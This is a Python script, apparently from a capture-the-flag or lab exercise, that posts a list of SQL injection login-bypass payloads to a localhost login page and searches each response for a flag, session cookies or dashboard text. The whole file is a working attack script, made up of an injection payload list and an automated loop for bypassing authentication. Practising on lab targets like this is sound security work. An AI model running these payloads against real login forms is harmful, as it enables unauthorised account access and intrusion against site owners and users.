import urllib.request
import urllib.parse
import ssl
import re

target_url = "http://127.0.0.1:33168/login.php"

# Bypass SSL verification if needed
ssl._create_default_https_context = ssl._create_unverified_context

payloads = [
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1#",
    "' OR '1'='1'",
    "' OR 1=1--",
    "admin' OR '1'='1",
    "' OR '1'='1'#",
    "' OR 1=1/*",
]

print("SQL Injection Login Bypass Test")
print("=" * 60)
print(f"Target: {target_url}\n")

for i, payload in enumerate(payloads, 1):
    try:
        # Prepare POST data
        post_data = urllib.parse.urlencode({
            'username': payload,
            'password': ''
        }).encode('utf-8')
        
        # Create request
        req = urllib.request.Request(target_url, data=post_data)
        req.add_header('User-Agent', 'Mozilla/5.0')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        # Send request
        with urllib.request.urlopen(req, timeout=30) as response:
            content = response.read().decode('utf-8', errors='ignore')
            status_code = response.getcode()
            headers = dict(response.headers)
            
            # Check for cookies
            cookies = headers.get('Set-Cookie', 'None')
            
            # Check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            
            print(f"[{i}] Payload: {payload}")
            print(f"      Status: {status_code}")
            print(f"      Length: {len(content)} chars")
            print(f"      Cookies: {cookies}")
            
            if flag_match:
                print(f"      [!] FOUND FLAG: {flag_match.group()}")
                print(f"\n      Full response:\n{content}")
            elif "welcome" in content.lower() or "dashboard" in content.lower():
                print(f"      [+] SUCCESS: Welcome/Dashboard detected!")
                print(f"      Preview: {content[:200]}")
            elif "error" in content.lower() or "invalid" in content.lower():
                print(f"      [-] Error response (likely failure)")
            else:
                print(f"      [?] Response: {content[:150]}")
            
            print("-" * 60)
            
    except Exception as e:
        print(f"[{i}] Payload: {payload}")
        print(f"      [!] Error: {str(e)}")
        print("-" * 60)

print("\n[*] Test complete")
